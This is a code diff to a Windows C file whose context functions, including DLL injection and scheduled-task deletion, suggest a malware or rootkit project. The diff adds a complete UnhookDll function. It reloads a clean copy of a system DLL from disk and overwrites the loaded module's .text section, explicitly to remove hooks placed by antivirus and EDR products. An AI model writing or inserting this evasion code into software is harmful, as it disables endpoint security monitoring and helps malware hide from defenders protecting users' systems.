@@ -433,6 +433,7 @@ BOOL DeleteScheduledTask(LPCWSTR name)
 
 	return result;
 }
+
 BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 {
 	BOOL result = FALSE;
@@ -538,6 +539,67 @@ DWORD RvaToOffset(LPBYTE dll, DWORD rva)
 		}
 
 		return 0;
+	}
+}
+VOID UnhookDll(LPCWSTR name)
+{
+	if (name)
+	{
+		WCHAR path[MAX_PATH + 1];
+		if (Is64BitOperatingSystem() && sizeof(LPVOID) == 4) lstrcpyW(path, L"C:\\Windows\\SysWOW64\\");
+		else lstrcpyW(path, L"C:\\Windows\\System32\\");
+
+		lstrcatW(path, name);
+
+		// Get original DLL handle. This DLL is possibly hooked by AV/EDR solutions.
+		HMODULE dll = GetModuleHandleW(name);
+		if (dll)
+		{
+			MODULEINFO moduleInfo = { };
+			if (GetModuleInformation(GetCurrentProcess(), dll, &moduleInfo, sizeof(MODULEINFO)))
+			{
+				// Retrieve a clean copy of the DLL file.
+				HANDLE dllFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+				if (dllFile != INVALID_HANDLE_VALUE)
+				{
+					// Map the clean DLL into memory
+					HANDLE dllMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+					if (dllMapping)
+					{
+						LPVOID dllMappedFile = MapViewOfFile(dllMapping, FILE_MAP_READ, 0, 0, 0);
+						if (dllMappedFile)
+						{
+							PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);
+
+							for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
+							{
+								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+
+								// Find the .text section of the hooked DLL and overwrite it with the original DLL section
+								if (!lstrcmpiA((LPCSTR)sectionHeader->Name, ".text"))
+								{
+									LPVOID virtualAddress = (LPVOID)((ULONG_PTR)moduleInfo.lpBaseOfDll + (ULONG_PTR)sectionHeader->VirtualAddress);
+									DWORD virtualSize = sectionHeader->Misc.VirtualSize;
+
+									DWORD oldProtect;
+									VirtualProtect(virtualAddress, virtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+									RtlCopyMemory(virtualAddress, (LPVOID)((ULONG_PTR)dllMappedFile + (ULONG_PTR)sectionHeader->VirtualAddress), virtualSize);
+									VirtualProtect(virtualAddress, virtualSize, oldProtect, &oldProtect);
+
+									break;
+								}
+							}
+						}
+
+						CloseHandle(dllMapping);
+					}
+
+					CloseHandle(dllFile);
+				}
+			}
+
+			FreeLibrary(dll);
+		}
 	}
 }
 
